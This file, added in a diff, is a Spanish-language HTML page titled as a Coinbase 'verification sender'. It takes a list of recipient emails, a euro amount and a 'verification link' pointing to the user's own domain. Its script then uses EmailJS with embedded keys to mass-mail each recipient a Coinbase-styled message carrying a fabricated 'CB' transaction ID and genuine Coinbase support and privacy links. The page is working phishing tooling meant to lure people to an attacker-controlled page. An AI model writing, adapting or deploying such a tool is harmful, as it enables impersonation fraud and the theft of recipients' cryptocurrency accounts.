@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviador de Verificaciones</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; padding: 20px; }
+        .container { max-width: 600px; background: white; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #1a1a1a; font-weight: 600; }
+        input, button { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+        button { background-color: #1652f0; color: white; border: none; cursor: pointer; transition: background 0.3s; }
+        button:hover { background-color: #1346d0; }
+        #status { margin-top: 15px; padding: 12px; border-radius: 6px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Enviador de Verificaciones Coinbase</h2>
+        
+        <form id="emailForm">
+            <div class="form-group">
+                <label>Correos destinatarios (separar por comas):</label>
+                <input type="text" id="recipients" placeholder="ejemplo1@dominio.com, ejemplo2@dominio.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Monto en Euros:</label>
+                <input type="number" id="amount" step="0.01" min="0.01" placeholder="Ej: 20000.50" required>
+            </div>
+
+            <div class="form-group">
+                <label>Enlace de Verificación:</label>
+                <input type="url" id="verificationLink" placeholder="https://tu-dominio.com/verificacion" required>
+            </div>
+
+            <div class="form-group">
+                <label>Enlace de Soporte:</label>
+                <input type="url" id="supportLink" placeholder="https://help.coinbase.com/es" required>
+            </div>
+
+            <div class="form-group">
+                <label>Política de Privacidad:</label>
+                <input type="url" id="privacyPolicy" placeholder="https://www.coinbase.com/es-es/legal/privacy" required>
+            </div>
+
+            <button type="submit">Enviar Verificaciones</button>
+        </form>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        emailjs.init('O78MKMMVfvat57KF5');
+
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const recipients = document.getElementById('recipients').value.split(',').map(email => email.trim());
+            const amount = parseFloat(document.getElementById('amount').value);
+            const verificationLink = document.getElementById('verificationLink').value;
+            const supportLink = document.getElementById('supportLink').value;
+            const privacyPolicy = document.getElementById('privacyPolicy').value;
+            
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = '🚀 Iniciando envío de verificaciones...';
+            statusElement.style.background = '#e8f4ff';
+            statusElement.style.color = '#1652f0';
+
+            let successCount = 0;
+            let errorCount = 0;
+
+            const sendNextEmail = (index) => {
+                if (index >= recipients.length) {
+                    statusElement.innerHTML = `
+                        ✅ ${successCount} correos enviados exitosamente<br>
+                        ❌ ${errorCount} errores de envío
+                    `;
+                    return;
+                }
+
+                const templateParams = {
+                    to_email: recipients[index],
+                    amount: `€ ${amount.toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
+                    verification_link: verificationLink,
+                    support_link: supportLink,
+                    privacy_policy: privacyPolicy,
+                    transaction_id: `CB${Date.now()}${Math.floor(Math.random() * 1000)}`
+                };
+
+                emailjs.send('service_qwk48fy', 'template_cizpv7g', templateParams)
+                    .then(() => {
+                        successCount++;
+                        statusElement.innerHTML += `<br>✔️ Enviado a: ${recipients[index]}`;
+                    })
+                    .catch((error) => {
+                        errorCount++;
+                        statusElement.innerHTML += `<br>❌ Error con: ${recipients[index]} (${error.text})`;
+                    })
+                    .finally(() => {
+                        sendNextEmail(index + 1);
+                    });
+            };
+
+            sendNextEmail(0);
+        });
+    </script>
+</body>
+</html>
